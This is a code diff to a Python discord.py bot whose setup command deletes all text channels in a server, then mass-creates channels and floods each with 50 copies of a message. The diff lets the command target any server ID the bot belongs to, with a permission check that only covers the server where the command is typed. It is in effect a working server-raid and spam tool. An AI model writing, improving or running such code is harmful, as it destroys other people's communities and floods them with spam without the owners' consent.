@@ -8,35 +8,40 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user.name}')
-    print("made by vox")
 
 @bot.command()
-async def setup(ctx):
-    # Delete all text channels
-    await delete_all_text_channels(ctx.guild)
+async def setup(ctx, server_id: int, num_channels: int, channel_name_template: str, *, message_content: str):
+    # Check if the user has the appropriate permissions to run the command
+    if ctx.author.guild_permissions.administrator:
+        guild = bot.get_guild(server_id)
+        if guild:
+            await delete_all_text_channels(guild)
 
-    # Create 100 channels and send 50 messages simultaneously
-    tasks = []
-    for i in range(100):
-        channel_name = f'channel-{i+1}'
-        tasks.append(create_channel_and_message(ctx, channel_name, 'Your custom message here'))
-
-        # Limit the number of simultaneous tasks to 50
-        if len(tasks) >= 50:
-            await asyncio.gather(*tasks)
             tasks = []
+            for i in range(num_channels):
+                channel_name = f'{channel_name_template}-{i + 1}'
+                tasks.append(create_channel_and_messages(ctx, guild, channel_name, message_content, 50))
 
-    # Ensure any remaining tasks are completed
-    if tasks:
-        await asyncio.gather(*tasks)
+                if len(tasks) >= 50:
+                    await asyncio.gather(*tasks)
+                    tasks = []
+
+            if tasks:
+                await asyncio.gather(*tasks)
+            await ctx.send("setup setup complete.")
+        else:
+            await ctx.send("Invalid server ID.")
+    else:
+        await ctx.send("You don't have permission to run this command.")
 
 async def delete_all_text_channels(guild):
     for channel in guild.channels:
         if isinstance(channel, discord.TextChannel):
             await channel.delete()
 
-async def create_channel_and_message(ctx, channel_name, message):
-    channel = await ctx.guild.create_text_channel(channel_name)
-    await channel.send(message)
+async def create_channel_and_messages(ctx, guild, channel_name, message_content, num_messages):
+    channel = await guild.create_text_channel(channel_name)
+    for _ in range(num_messages):
+        await channel.send(message_content)
 
-bot.run('YOUR-DC-TOKEN-HERE')
+bot.run('YOUR-BOT-TOKEN')
